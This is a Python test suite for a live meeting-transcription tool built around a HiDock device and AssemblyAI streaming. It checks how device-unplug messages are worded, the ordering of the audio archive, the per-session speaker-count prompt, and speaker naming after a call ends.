def test_an_unplug_is_reported_to_the_operator_in_their_own_language(
    controller, description, build_adapter, raw_marker
):
    """FR-6.4. The commonest way a live call ends is the cable, and the operator
    must be told what to DO about it.

    Driven through the REAL `RealtimeSession`, with no failure text injected
    anywhere. That is the whole point: `_translate_live_failure` matches on
    markers taken from strings `realtime` raises, and a test that hands the pump
    its own string pins the translator against a copy of the input rather than
    against the module that produces it. Reword the raise site in `realtime.py`
    and an injected-string test stays green while every real unplug goes back to
    reading "Live transcription stopped — adapter exposes no Jensen transport",
    which names no cause, no device, and no next move.

    The raw text is required to SURVIVE the translation: a screenshot of the
    activity log is the only diagnostic this feature has.
    """
    # MUTATION: delete either entry from `_DEVICE_GONE_MARKERS`, or return `raw`
    # unchanged from `_translate_live_failure` — the message then reaches the
    # operator as the transport's own jargon.
    built: List[object] = []

    def _real_capture(adapter, **kwargs):
        # The real class, exactly as `__main__` supplies it (`capture_factory=
        # RealtimeSession`); recorded only so the assertion below can prove the
        # message came from it and not from a double.
        made = RealtimeSession(adapter, **kwargs)
        built.append(made)
        return made

    harness = controller(adapter=build_adapter(), capture_factory=_real_capture)
    harness.controller.start()

    _wait_until(lambda: not harness.controller.is_live, msg="session stayed live")

    assert built and isinstance(built[0], RealtimeSession), (
        "the failure was produced by a double, so the translation was pinned "
        "against a hand-copied string"
    )

    endings = [
        event for event in harness.errors()
        if "transcription stopped" in event.message.lower()
    ]
    assert endings, f"{description}: the operator was never told the call ended"
    ending = endings[-1]
    assert ending.severity is Severity.ERROR

    text = ending.message
    lowered = text.lower()
    # The thing that broke, by the name on the box.
    assert "hidock" in lowered, f"the message names no device: {text}"
    assert "usb" in lowered, f"the message names no connection: {text}"
    # The cause, in the operator's terms rather than the transport's.
    assert "unplugged" in lowered, f"the message names no cause: {text}"
    # The next move, and the reassurance that acting on it costs nothing.
    assert "reconnect" in lowered and "press l" in lowered, (
        f"the message names no remedy: {text}"
    )
    assert "transcript above is kept" in lowered, (
        f"the message does not say the transcript survives: {text}"
    )
    # ...and the original, so the screenshot is still diagnosable.
    assert raw_marker in text, (
        f"the translation discarded the raw failure: {text}"
    )

    # The claim is released either way — a translated message that stranded the
    # device claim would be a nicer sentence about a worse bug.
    assert harness.resumes == 1


def test_every_element_with_an_explicit_display_can_still_be_hidden():
    """The `hidden` attribute is only as strong as the UA stylesheet.

    `[hidden] { display: none }` comes from the user-agent sheet, so ANY author
    rule with an explicit `display` outranks it. `#live-indicator` sets
    `display: inline-flex`, so `indicator.hidden = true` set the attribute and
    changed nothing on screen — the operator saw
    "LIVE — audio is streaming to AssemblyAI" next to "Session ended"
    (2026-08-27). FR-2.5 calls that indicator a security control; an indicator
    that cannot turn off is one the operator learns to stop reading, which
    costs the signal exactly when it matters.

    Structural rather than element-specific: any FUTURE element that sets a
    display and is toggled with `hidden` inherits the same trap, so this pins
    the override that saves all of them.

    MUTATION: delete the `[hidden] { display: none !important; }` rule, or drop
    its `!important`, and this test fails.
    """
    import re

    from hidock_direct.live_server import PAGE

    css = PAGE
    override = re.search(r"\[hidden\]\s*\{[^}]*display\s*:\s*none\s*!important", css)
    assert override, (
        "no `[hidden] { display: none !important }` rule — an element with an "
        "explicit `display` cannot be hidden by the `hidden` attribute"
    )

    # And the specific element that caught it must still declare its display,
    # so this test keeps meaning something rather than passing because the
    # conflict was removed.
    assert re.search(r"#live-indicator\s*\{[^}]*display\s*:", css), (
        "#live-indicator no longer sets a display; re-point this test at "
        "whatever element now needs the override, or drop it"
    )


# ==========================================================================
# Phase 1d — the ARCHIVE wiring (`live_archive_prd.md` §7)
#
# `test_live_archive.py` pins the recorder. Nothing pinned the controller that
# feeds it: the archive being handed every frame, `names` being passed as a
# CALLABLE, the save line, the three error floors, and the two ordering claims
# §7 rests on. Every one of those could have been deleted and both suites would
# have stayed green — which is the failure mode `ad98cbc` shipped for the retry
# surface and the reason this file's header names reachability as a property.
#
# These tests opt in by passing `archive_dir`; a controller without one archives
# nothing by design, which is why the rest of the file is unaffected.
# ==========================================================================


def _archiving(controller, tmp_path, **overrides):
    """A controller wired to a `FakeArchive`, started, with one frame delivered."""
    harness = controller(archive_dir=tmp_path / "archive", **overrides)
    harness.controller.start()
    return harness


def test_the_composition_that_has_an_archive_dir_builds_a_recorder(controller, tmp_path):
    """FR-1.1. The device does not keep a recording for a live session, so ours is
    the only copy that will ever exist. It is built from `config.archive_dir` and
    handed the bus and the operator's name."""
    # MUTATION: `_new_archive` returns None unconditionally, or `start()` stops
    # calling it — the session still works, and every recording is silently lost.
    harness = _archiving(controller, tmp_path)

    assert harness.archives, "a configured archive_dir built no recorder"
    assert harness.archive.archive_dir == tmp_path / "archive"
    assert harness.archive.bus is harness.bus
    assert harness.archive.operator_name == harness.surface.kwargs["operator_name"]
    assert harness.archive.entered == 1, "the recorder was built but never entered"

    harness.controller.stop()


def test_no_archive_dir_means_no_recorder_and_no_complaint(controller):
    """The pre-1d composition. `None` is a real configuration, not a failure, and
    must not manufacture an error line on a session that is working."""
    # MUTATION: drop the `if self._archive_dir is None: return None` guard, and
    # every archive-less composition publishes an ERROR on every `l`.
    harness = controller()
    harness.controller.start()

    assert harness.archives == []
    problems = [e for e in harness.errors() if e.severity is Severity.ERROR]
    assert problems == [], f"an archive-less composition complained: {problems}"

    harness.controller.stop()

    assert [e for e in harness.errors() if "recorded" in e.message] == []
    assert [e for e in harness.errors() if "saved" in e.message] == []


def test_every_frame_reaches_the_archive_before_it_reaches_the_wire(controller, tmp_path):
    """§7's ordering: audio to the disk BEFORE the bridge. Ours is the only
    recording that will exist and `feed()` is the call that can end the session,
    so a frame fed first and written second is a frame that can be lost."""
    # MUTATION: swap the two statements in the pump's loop body, so `feed(frame)`
    # runs before `self._record(archive, frame, generation)`.
    harness = _archiving(controller, tmp_path)
    _wait_until(lambda: harness.transcriber.fed, msg="no frame ever reached the bridge")

    assert harness.archive.written == harness.transcriber.fed, (
        "the archive and the bridge did not see the same frames"
    )
    # Order, not just presence. Both markers land on the ONE shared timeline, so
    # "written before fed" is read off the real interleaving rather than inferred
    # from two independent counters that happen to agree.
    steps = [s for s in harness.timeline if s in ("archive.write", "feed")]
    assert steps[:2] == ["archive.write", "feed"], (
        f"the first frame reached the wire before the disk: {steps[:4]}"
    )

    harness.controller.stop()


def test_names_is_handed_as_a_callable_so_it_is_read_at_stop(controller, tmp_path):
    """§5, and the reason `_new_archive` passes `surface.speaker_names` rather than
    `surface.speaker_names()`. A name typed in the last minute of a call must reach
    the lines rendered in the first; a snapshot taken at session start archives a
    document of `Speaker 1`s for a call whose speakers were named."""
    # MUTATION: `names=surface.speaker_names()` — a dict frozen at session start.
    # Everything else still passes; only this test sees the difference.
    harness = _archiving(controller, tmp_path)

    assert callable(harness.archive.names), (
        "the archive was handed a snapshot; a name set after start can never reach it"
    )
    assert harness.surface.speaker_names_reads == [], "the map was read at START"

    # The operator names a speaker DURING the call, exactly as `POST /names` does.
    harness.surface.set_name("A", "Dana")

    harness.controller.stop()

    assert harness.archive.names_at_stop == {"A": "Dana"}, (
        f"the archive rendered from {harness.archive.names_at_stop}, not the map as "
        "it stood at stop"
    )


def test_the_save_line_names_both_paths_at_info(controller, tmp_path):
    """The operator has just been told by this project that live audio was being
    lost. "It is saved, here" is the line that closes that, and it names paths so
    the file can be opened without going looking for it."""
    # MUTATION: publish a count ("live session saved") instead of the paths, or
    # drop the `if saved:` publish from `_teardown` entirely.
    harness = _archiving(controller, tmp_path)
    wav = tmp_path / "archive" / "2026-08-27_101500.wav"
    md = tmp_path / "archive" / "2026-08-27_101500.md"
    harness.archive._wav_path = wav
    harness.archive._transcript_path = md

    harness.controller.stop()

    saved = [e for e in harness.infos() if str(wav) in e.message]
    assert len(saved) == 1, f"expected exactly one save line, got {harness.messages()}"
    assert str(md) in saved[0].message, "the transcript path was not named"
    assert saved[0].severity is Severity.INFO, "a successful save is not a problem"


def test_a_session_that_recorded_nothing_announces_nothing(controller, tmp_path):
    """FR-1.5. No audio means no file, and a save line naming a path that does not
    exist is worse than silence — it is the operator's evidence the call is safe."""
    # MUTATION: `_finalise_archive` returns its message before the `wav is None`
    # check, so an empty session reports "Live session saved — audio None".
    harness = _archiving(controller, tmp_path)
    assert harness.archive.wav_path is None

    harness.controller.stop()

    assert [e for e in harness.infos() if "saved" in e.message] == []
    assert "None" not in harness.messages()


def test_a_failed_transcript_still_names_the_audio(controller, tmp_path):
    """FR-ERR-3. Audio without a transcript is recoverable — by hand or through the
    batch path — and naming the file is what makes it so. The reverse is not."""
    # MUTATION: `if transcript is None: return None`, which loses the recording to
    # the operator even though it is sitting on disk.
    harness = _archiving(controller, tmp_path)
    wav = tmp_path / "archive" / "2026-08-27_101500.wav"
    harness.archive._wav_path = wav
    harness.archive._transcript_path = None

    harness.controller.stop()

    named = [e for e in harness.errors() if str(wav) in e.message]
    assert len(named) == 1, f"the audio path was never named: {harness.messages()}"


def test_a_recorder_that_cannot_be_built_costs_the_recording_not_the_call(
    controller, tmp_path
):
    """FR-ERR-1. The transcript on screen is still worth having. An unwritable
    archive path must be surfaced, not raised — a raise here happens between the
    device claim being taken and the pump existing."""
    # MUTATION: let `_new_archive` propagate, and an unwritable archive directory
    # turns pressing `l` into a hard failure that also leaks the FR-6.3 suspension.
    harness = controller(archive_dir=tmp_path / "archive")
    harness.archive_error = OSError("read-only file system")

    harness.controller.start()

    assert harness.controller.is_live is True, "the call died over a file write"
    assert harness.archives == []
    complaints = [e for e in harness.errors() if "read-only file system" in e.message]
    assert len(complaints) == 1, f"the operator was not told: {harness.messages()}"
    assert complaints[0].severity is Severity.ERROR
    _wait_until(lambda: harness.transcriber.fed, msg="the bridge never ran")

    harness.controller.stop()
    assert harness.resumes == 1, "the FR-6.3 suspension leaked"


def test_a_write_failure_stops_recording_once_not_once_per_frame(controller, tmp_path):
    """FR-ERR-2. `frames()` yields ~10 chunks/sec, so a per-frame message buries
    the activity log in seconds and the operator stops reading it."""
    # MUTATION: drop the `recording = self._record(...)` assignment (or ignore the
    # return), so every subsequent frame re-raises and re-announces.
    frames = [Frame(near=b"\x00\x00", far=b"\x11\x11", seq=n) for n in range(1, 6)]
    harness = controller(archive_dir=tmp_path / "archive")
    harness.controller.start()
    harness.archive.write_error = OSError("input/output error")
    harness.capture.frames_to_yield = frames
    harness.capture.released.set()

    _wait_until(
        lambda: len(harness.transcriber.fed) >= len(frames),
        msg="the session did not survive the write failure",
    )

    complaints = [e for e in harness.errors() if "input/output error" in e.message]
    assert len(complaints) == 1, (
        f"{len(complaints)} messages for one failure across {len(frames)} frames"
    )

    harness.controller.stop()


def test_the_archive_is_finalised_before_the_surface_stops(controller, tmp_path):
    """`LiveSurface.stop()` clears the name map, and the transcript is rendered
    FROM that map. Finalising after the surface archives a document of `Speaker 1`s
    for a call whose speakers the operator had already named."""
    # MUTATION: move `self._finalise_archive(...)` below the `surface.stop()` block
    # in `_teardown`. Every counter still agrees; only the names are gone.
    #
    # The pump's own `with` ordinarily finalises the recording while the surface
    # is still untouched, which makes `_teardown`'s ordering invisible on the
    # happy path. So this drives the path that MOTIVATED it: `stop()` joins the
    # pump for five seconds and then tears down regardless, and a pump blocked
    # longer than that on a device read has finalised nothing. A capture whose
    # `stop()` does not release is exactly that pump.
    stuck = threading.Event()

    def blocked_on_a_device_read():
        # Blocks INSIDE `capture.frames()`, which is where a wedged Jensen read
        # actually blocks — so the pump has entered no `finally` and finalised
        # nothing when `stop()`'s bounded join gives up on it. Installed by the
        # FACTORY, not on the instance afterwards: the pump thread is already
        # calling `frames()` by the time `start()` returns.
        stuck.wait(timeout=30.0)
        return iter(())

    def wedged_capture_factory(adapter, **kwargs):
        made = FakeCapture(adapter, **kwargs)
        made.frames = blocked_on_a_device_read
        return made

    harness = controller(
        archive_dir=tmp_path / "archive", capture_factory=wedged_capture_factory
    )
    harness.controller.start()
    harness.surface.set_name("A", "Dana")

    try:
        harness.controller.stop()

        assert harness.archive.stops >= 1, "neither the pump nor teardown finalised"
        assert harness.archive.names_at_stop == {"A": "Dana"}, (
            f"the recording was finalised after the surface cleared the map: "
            f"{harness.archive.names_at_stop}"
        )
    finally:
        stuck.set()


def test_the_archive_is_the_outermost_context_so_it_closes_last(controller, tmp_path):
    """§7 sketches the archive innermost. That would finalise the transcript BEFORE
    `transcriber.__exit__` closes the provider sessions — and that close delivers
    each speaker's final turn. Innermost drops the last thing everyone said from
    the archived document while leaving it on screen, and the document is the copy
    the pipeline reads."""
    # MUTATION: reorder the pump's `with` statements to put `recorder` innermost.
    harness = _archiving(controller, tmp_path)

    harness.controller.stop()
    _wait_until(
        lambda: "archive.exit" in harness.timeline,
        msg="the archive context never closed",
    )

    steps = [
        s
        for s in harness.timeline
        if s.endswith(".enter") or s.endswith(".exit")
    ]
    assert steps == [
        "archive.enter",
        "capture.enter",
        "transcriber.enter",
        "transcriber.exit",
        "capture.exit",
        "archive.exit",
    ], f"the contexts are not nested archive-outermost: {steps}"


def test_stop_is_idempotent_across_the_pump_and_the_teardown(controller, tmp_path):
    """Both the pump's `with` and `_teardown` finalise, by design — `stop()` joins
    the pump for five seconds and then tears down regardless. `LiveArchive.stop()`
    is idempotent for exactly that, and the wiring must not render twice."""
    # MUTATION: `_finalise_archive` renders instead of delegating, or the pump
    # stops using `with` — either way a second document is produced.
    harness = _archiving(controller, tmp_path)
    harness.archive._wav_path = tmp_path / "archive" / "a.wav"
    harness.archive._transcript_path = tmp_path / "archive" / "a.md"

    harness.controller.stop()
    harness.controller.stop()

    saved = [e for e in harness.infos() if "saved" in e.message]
    assert len(saved) == 1, f"the save line was published {len(saved)} times"
    assert harness.archive.names_at_stop is not None


def test_an_archive_that_raises_on_stop_still_releases_the_device(controller, tmp_path):
    """Everything after `_finalise_archive` releases the claim. A raise there would
    strand the offload worker suspended (FR-6.3) over a file write, and the only
    symptom is the absence of something."""
    # MUTATION: call `_finalise_archive` outside its try, or drop `_teardown`'s
    # `finally: self._resume()`.
    harness = _archiving(controller, tmp_path)
    harness.archive.stop_error = OSError("no space left on device")

    harness.controller.stop()

    assert harness.resumes == 1, "the FR-6.3 suspension leaked over a file write"
    assert harness.controller.is_live is False
    assert "no space left on device" in harness.messages()


def test_a_stale_pump_cannot_finalise_the_next_sessions_recording(controller, tmp_path):
    """The archive is passed to `_pump` rather than read off `self`, for the same
    reason `generation` is: a pump that outlived its `stop()` join would otherwise
    reach into the NEXT session and finalise ITS recording mid-call."""
    # MUTATION: `_pump` reads `self._archive` instead of taking it as an argument.
    harness = _archiving(controller, tmp_path)
    first = harness.archive
    harness.controller.stop()

    harness.controller.start()
    second = harness.archive
    assert second is not first, "the second session reused the first's recorder"

    # The first session's recorder was finalised once, by its own session.
    assert first.stops >= 1
    stops_before = second.stops

    # Release the FIRST session's capture: its pump now runs its `finally` late.
    harness.captures[0].released.set()
    time.sleep(0.2)

    assert second.stops == stops_before, (
        "a stale pump finalised the live session's recording"
    )
    harness.controller.stop()


def test_the_surface_exposes_the_operators_names_keyed_by_provider_label():
    """`render_markdown(speaker_names=...)` matches against the PROVIDER's label
    (`utterances[].speaker`), so the map is handed across unchanged rather than
    pre-resolved. Resolving here would produce a map that matches nothing."""
    # MUTATION: `speaker_names` returns `{display_name: name}` or resolves labels
    # to "Speaker 1" first — the archive then renders every line as a number.
    surface = LiveSurface(operator_name="Blake")
    surface.set_name("A", "Dana")

    names = surface.speaker_names()

    assert names == {"A": "Dana"}, (
        "the map is not keyed by the provider label render_markdown matches on"
    )
    assert names is not surface.__dict__.get("_names"), "handed out its own mutable map"

    # And it is a SNAPSHOT: mutating the returned map must not reach the surface,
    # since the archive holds it while the operator is still typing into the panel.
    names["B"] = "Sam"
    assert surface.speaker_names() == {"A": "Dana"}


# ==========================================================================
# Phase 1e — the per-session speaker ceiling
# (live_speaker_count_prompt_prd.md §5 U-1, U-5, U-6, U-8, U-9, U-10)
#
# `max_speakers` lives on `StreamingParameters`, NOT on the updateable
# `StreamingSessionParameters`, so it can only be chosen as the session opens —
# which is the moment `l` is pressed. That is why it travels as an argument all
# the way from a keystroke to a wire parameter, and why the tests below refuse
# to stop at the controller's kwarg: a value that reaches `start()` and not the
# far session's `StreamingParameters` buys nothing at all.
# ==========================================================================


from assemblyai.streaming.v3 import StreamingClient as _RealStreamingClient


class _CapturingStreamingClient:
    """Faithful stand-in for `StreamingClient`, holding the params it was given.

    Not `**kwargs`-permissive, like every other double in this file: it binds
    each call against the real SDK class first, so a drift between our call site
    and the SDK surfaces here rather than in a paid session.
    """

    def __init__(self, channel: str):
        self.channel = channel
        self.params = None
        self.streamed: List[bytes] = []

    def connect(self, params) -> None:
        _bind_against(_RealStreamingClient.connect, params)
        self.params = params

    def stream(self, data) -> None:
        _bind_against(_RealStreamingClient.stream, data)
        self.streamed.append(bytes(data))

    def disconnect(self, terminate: bool = False) -> None:
        _bind_against(_RealStreamingClient.disconnect, terminate=terminate)

    def on(self, event, handler) -> None:
        _bind_against(_RealStreamingClient.on, event, handler)


def _real_bridge(clients: Dict[str, _CapturingStreamingClient]):
    """A transcriber factory that builds the REAL `LiveTranscriber`.

    The point of the whole chain is what lands in `StreamingParameters`, and
    `_params` — the code that decides which channel is diarized and under what
    ceiling — only runs in the real bridge. A `FakeTranscriber` recording its
    kwargs proves the controller passed a number, not that the number became a
    session parameter.
    """

    def factory(bus, **kwargs):
        def client_factory(channel: str) -> _CapturingStreamingClient:
            made = _CapturingStreamingClient(channel)
            clients[channel] = made
            return made

        return LiveTranscriber(bus, client_factory=client_factory, **kwargs)

    return factory


def _prompted_tui(harness) -> TUI:
    """A real TUI over the harness's real controller — the operator's own path."""
    tui = TUI(bus=harness.bus, live_controller=harness.controller,
              keyboard=_NoopKeyboard())
    tui._state = "CONNECTED_IDLE"
    return tui


def _answer(tui, typed: str = "") -> None:
    """Press `l`, type `typed`, confirm — asserting the prompt actually mediated.

    The two assertions are load-bearing rather than defensive. Without them a
    test that only inspects what reached the wire passes against an
    implementation with NO prompt at all: `l` starts a session under the
    configured ceiling, the digits fall through to the unmapped-key branch, and
    `\r` does nothing — and the far session's parameters look exactly right for
    the one case where the operator typed the default anyway.
    """
    tui._on_key("l")
    assert tui._speaker_prompt is not None, "`l` did not open the speaker prompt"
    for ch in typed:
        tui._on_key(ch)
    tui._on_key("\r")
    assert tui._speaker_prompt is None, "the prompt did not close on confirmation"


# -- U-1: the keystroke claims nothing --------------------------------------


def test_pressing_l_claims_no_device_and_opens_no_window(controller):
    """U-1 / FR-1.1 against the REAL controller, which is where the claims are.

    Starting a session suspends offload polling (the live stream and the poll
    loop drive the same Jensen endpoint), binds a loopback HTTP server and
    launches a browser window. A prompt that opened AFTER any of that would have
    the operator choosing a number while their offload worker was already
    suspended — and a suspension released only on a session's exit paths is one
    a cancelled prompt might never release at all.

    MUTATION: keep `self._live_controller.toggle()` on the `l` branch and open
    the prompt afterwards.
    """
    harness = controller()
    tui = _prompted_tui(harness)

    tui._on_key("l")

    assert tui._speaker_prompt is not None, "`l` did not open the prompt"
    assert harness.suspends == 0, "offload polling was suspended before confirmation"
    assert harness.surfaces == [], "a surface was bound before confirmation"
    assert harness.launched == [], "a browser window was opened before confirmation"
    assert harness.captures == [], "the device was claimed before confirmation"
    assert harness.controller.is_live is False


def test_cancelling_the_prompt_leaves_the_offload_worker_untouched(controller):
    """U-4's consequence, and the one that is invisible when it goes wrong: a
    suspended poll loop silently stops discovering recordings, and its only
    symptom is an absence.

    MUTATION: suspend polling when the prompt OPENS rather than when the session
    starts — `esc` then leaves the worker suspended with no session to resume it.
    """
    harness = controller()
    tui = _prompted_tui(harness)

    tui._on_key("l")
    tui._on_key("\x1b")

    assert harness.suspends == 0
    assert harness.resumes == 0
    assert harness.surfaces == []


# -- U-5 / U-6: the number reaches the far session's StreamingParameters -----


def test_the_typed_count_reaches_the_far_sessions_max_speakers(controller):
    """U-5 / FR-2.3, end to end: a keystroke at the TUI becomes a parameter on
    the far channel's provider session, through the real `LiveTranscriber`.

    Every link in that chain has been a place a value died in this project
    before — `ad98cbc` shipped a surface no keystroke reached, and `eccf4a8` a
    retry path whose kwargs the callee refused. Asserting on the controller's
    kwarg would leave the last two links untested, and the ceiling only exists
    once it is on the wire.

    MUTATION: `transcriber_factory(bus, api_key=..., max_speakers=self._max_speakers)`
    — ignore the per-session argument and pass the configured default. The
    prompt then reads as though it works and every call runs at 8.
    """
    clients: Dict[str, _CapturingStreamingClient] = {}
    harness = controller(transcriber_factory=_real_bridge(clients), max_speakers=8)
    tui = _prompted_tui(harness)

    _answer(tui, "3")

    _wait_until(
        lambda: "far" in clients and clients["far"].params is not None,
        msg="the far session never connected",
    )
    assert clients["far"].params.max_speakers == 3, (
        f"the far session opened under a ceiling of "
        f"{clients['far'].params.max_speakers}, not the 3 the operator typed"
    )
    assert clients["far"].params.speaker_labels is True


def test_enter_alone_puts_the_prepopulated_default_on_the_wire(controller):
    """U-2's end of the same chain. Enter is the common case — the operator who
    does not override — so the default has to travel the identical path rather
    than through a branch that skips the argument.

    MUTATION: pass `max_speakers=None` when the operator typed nothing and let
    the bridge's own `DEFAULT_MAX_SPEAKERS` (6, from phase 1b) apply — the
    configured 8 never reaches the wire and `HIDOCK_LIVE_MAX_SPEAKERS` is inert.
    """
    clients: Dict[str, _CapturingStreamingClient] = {}
    harness = controller(transcriber_factory=_real_bridge(clients), max_speakers=8)
    tui = _prompted_tui(harness)

    _answer(tui)

    _wait_until(
        lambda: "far" in clients and clients["far"].params is not None,
        msg="the far session never connected",
    )
    assert clients["far"].params.max_speakers == 8


@pytest.mark.parametrize("typed", ["1", "10"])
def test_the_near_session_requests_no_diarization_whatever_the_count(controller, typed):
    """U-6 / FR-2.3. The near channel is the operator — one person, by the
    BlueCatch topology — so it requests no diarization at all and cannot emit a
    wrong speaker label because it emits none. The per-session ceiling must not
    leak onto it: a near session carrying `speaker_labels` would start splitting
    the operator's own voice across labels on a quiet line.

    Both ends of the vendor's range, because a leak is most likely to be written
    as "pass it to both and let the far one care".

    MUTATION: `max_speakers=self._max_speakers` unconditionally in
    `LiveTranscriber._params`, dropping the `if diarize` guard.
    """
    clients: Dict[str, _CapturingStreamingClient] = {}
    harness = controller(transcriber_factory=_real_bridge(clients), max_speakers=8)
    tui = _prompted_tui(harness)

    _answer(tui, typed)

    _wait_until(
        lambda: "near" in clients and clients["near"].params is not None,
        msg="the near session never connected",
    )
    assert clients["near"].params.max_speakers is None
    assert not clients["near"].params.speaker_labels


# -- the controller's own contract ------------------------------------------


def test_the_controller_exposes_the_configured_default_for_the_prompt(controller):
    """U-2 / FR-2.5. The prompt prepopulates from the CONTROLLER's configured
    value, which `__main__` wires to `config.live_max_speakers` (asserted
    against the real composition root by
    `test_the_composition_root_wires_every_seam_to_the_real_collaborator`).
    Reading it from anywhere else would give the prompt a second source of the
    same default.

    MUTATION: return `DEFAULT_MAX_SPEAKERS` from the property instead of the
    configured value — every clone then prompts with 6 whatever the operator set.
    """
    harness = controller(max_speakers=4)

    assert harness.controller.default_max_speakers == 4


def test_a_session_never_rewrites_the_default_the_next_prompt_reads(controller):
    """U-9 / FR-2.5 at the controller. The concrete failure: a 10-person call
    settles on 10, the next call is a 1:1, and a silently-carried 10 splits one
    remote voice across several labels — the exact defect this PRD was filed to
    fix, reintroduced from the other direction.

    MUTATION: `self._max_speakers = max_speakers` at the top of `start()`. The
    per-session value becomes sticky and every subsequent prompt is prepopulated
    from the last call.
    """
    harness = controller(max_speakers=8)

    harness.controller.start(max_speakers=10)
    harness.controller.stop()

    assert harness.controller.default_max_speakers == 8


def test_a_start_with_no_ceiling_uses_the_configured_default(controller):
    """The shutdown path and any future caller that has no operator answer must
    still get a working session rather than a `None` on the wire.

    MUTATION: `max_speakers=max_speakers` passed straight through, so a call
    without one hands `None` to the bridge and the far session's diarization
    request is malformed.
    """
    harness = controller(max_speakers=5)

    harness.controller.start()

    assert harness.transcriber.kwargs["max_speakers"] == 5


def test_the_controller_refuses_a_ceiling_outside_the_vendor_range(controller):
    """U-8 at the controller — the layer the TUI is not the only caller of.

    A clamp here would be worse than at the prompt, because nothing above it
    would ever report the substitution: past the ceiling the vendor MERGES
    additional speakers into the closest existing label, so a 11-clamped-to-10
    session destroys a distinction rather than degrading it, silently, on a
    call the operator is paying for.

    MUTATION: `max_speakers=min(10, max(1, max_speakers))` in `start()`.
    """
    harness = controller(max_speakers=8)

    with pytest.raises(LiveSessionError) as excinfo:
        harness.controller.start(max_speakers=11)

    assert "1-10" in str(excinfo.value).replace("–", "-")
    assert harness.transcribers == [], "a session opened under a clamped ceiling"
    assert harness.surfaces == [], "a surface was bound for a refused session"
    assert harness.suspends == 0, "offload polling was suspended for a refused session"
    assert harness.controller.is_live is False


def test_toggle_carries_the_ceiling_and_still_never_raises(controller):
    """`toggle()` is what the keyboard thread calls, and `KeyboardReader._run`
    swallows exceptions — so a refusal that raised there is a keypress that does
    nothing, with no message. It has to carry the number AND keep that contract.

    MUTATION: `def toggle(self)` without the parameter (a TypeError the keyboard
    thread eats), or let the range refusal propagate out of `toggle`.
    """
    harness = controller(max_speakers=8)

    harness.controller.toggle(max_speakers=2)
    assert harness.transcriber.kwargs["max_speakers"] == 2

    harness.controller.toggle()  # the stop half — no ceiling to carry
    assert harness.controller.is_live is False

    harness.controller.toggle(max_speakers=99)  # must not raise
    assert harness.controller.is_live is False
    assert "1-10" in harness.messages().replace("–", "-"), (
        "an out-of-range ceiling was refused without telling the operator why"
    )


# -- U-10: the refusal that has to precede the prompt -----------------------


def test_start_refusal_is_none_when_a_session_could_start(controller):
    """The TUI asks before opening a prompt, so the question must be answerable
    without doing anything.

    MUTATION: implement `start_refusal()` by calling `start()` in a try/except —
    it would answer correctly and leave a live session behind.
    """
    harness = controller()

    assert harness.controller.start_refusal() is None
    assert harness.surfaces == []
    assert harness.suspends == 0
    assert harness.controller.is_live is False


def test_start_refusal_names_the_in_flight_offload(controller):
    """U-10 / FR-ERR-2. Only the controller can name the offload, and the reason
    is the whole value of refusing early: "live transcription unavailable" would
    leave the operator pressing `l` until the transfer happened to finish.

    MUTATION: return a bare `True`/`False` instead of the reason — the TUI then
    has nothing to show and invents its own wording.
    """
    harness = controller(busy=True)

    reason = harness.controller.start_refusal()

    assert reason, "a busy device was not refused"
    assert "offload" in reason.lower() or "transfer" in reason.lower()


def test_the_refusal_the_prompt_reads_is_the_one_start_raises(controller):
    """An agreement test that calls BOTH implementations rather than restating
    either. The `10fba18` lesson: the agreement test it replaced hand-copied the
    rule it claimed to check, so it pinned the copy and stayed green across a
    total rewrite.

    Two refusal texts kept in step by convention is how the operator ends up
    reading one reason at the prompt and a different one from the session that
    then fails anyway.

    MUTATION: leave `start()`'s own `if self._busy(): raise LiveSessionError(...)`
    in place alongside a separately-worded `start_refusal()`.
    """
    harness = controller(busy=True)

    reason = harness.controller.start_refusal()
    with pytest.raises(LiveSessionError) as excinfo:
        harness.controller.start()

    assert str(excinfo.value) == reason, (
        "the prompt's refusal and the start refusal are two different strings, "
        "which means two implementations of one rule"
    )


def test_a_busy_device_opens_no_prompt_and_claims_nothing(controller):
    """U-10 through the operator's own entry point. Refusing AFTER the operator
    has chosen a number wastes the decision and reads as though the number
    caused the failure.

    MUTATION: open the prompt first and let `toggle()` surface the refusal on
    confirm.
    """
    harness = controller(busy=True)
    tui = _prompted_tui(harness)

    tui._on_key("l")

    assert tui._speaker_prompt is None, "the prompt opened over a refused start"
    assert harness.surfaces == []
    assert harness.suspends == 0
    joined = " ".join(message for _when, message, _sev in tui._log).lower()
    assert "offload" in joined or "transfer" in joined, (
        "the operator was not told why `l` did nothing"
    )


# ---------------------------------------------------------------------------
# Post-session naming (phase 1f) -- the window outlives the call
# ---------------------------------------------------------------------------
#
# This reverses `live_surface_prd.md` FR-1.6, which made shutdown-at-session-end
# a security property. The reversal is argued in `post_session_naming_prd.md`
# §5: the labels most worth naming are the ones AssemblyAI revises in as a call
# ends, and taking the page down at that instant is what made the operator type
# a name into a dead window. Every control that made the live window safe is
# retained, and the tests below assert that rather than assume it.


def test_the_server_keeps_serving_after_the_session_ends(live):
    """FR-1.1. The narrow half of `stop()`: the call is over, the page is not.

    MUTATION: make `end_session` call `stop()`.
    """
    surface = live.surface()
    surface.publish(LiveTurn(channel=LiveChannel.FAR, text="hello",
                             speaker="A", turn_order=0, is_final=True))

    surface.end_session()

    assert surface.running is True
    status, body, _headers = _get_as_page(surface)
    assert status == 200
    assert "<header>" in body


def test_naming_still_works_after_the_session_ends(live):
    """FR-1.3 and FR-3.1 -- the operator's actual complaint, as a test.

    MUTATION: keep clearing `_names` in `end_session`; or refuse `/names` once
    `_session_live` is False.
    """
    surface = live.surface()
    surface.publish(LiveTurn(channel=LiveChannel.FAR, text="hello",
                             speaker="A", turn_order=0, is_final=True))
    surface.end_session()

    status, _body = _post_as_page(surface, {"label": "A", "name": "Dana"})

    assert status == 200
    assert surface.speaker_names() == {"A": "Dana"}


def test_names_typed_during_the_call_survive_the_call_ending(live):
    """FR-1.1. The map is what the operator built WHILE the call ran.

    Clearing it at the end would silently undo an hour of naming at the exact
    moment they can no longer watch it happen: the panel empties, every line
    reverts to `Speaker A`, and the archived transcript — rendered from this
    same map — is the one that was already correct.

    MUTATION: clear `_names` in `end_session`, which is what `stop()` does and
    is the single most natural way to write this wrong.
    """
    surface = live.surface()
    surface.publish(LiveTurn(channel=LiveChannel.FAR, text="hello",
                             speaker="A", turn_order=0, is_final=True))
    surface.set_name("A", "Dana")

    surface.end_session()

    assert surface.speaker_names() == {"A": "Dana"}
    page = live.page(surface)
    turns = [p for p in page.read(5, timeout=2.0) if p.get("kind") == "turn"]
    assert [t["display_name"] for t in turns] == ["Dana"]


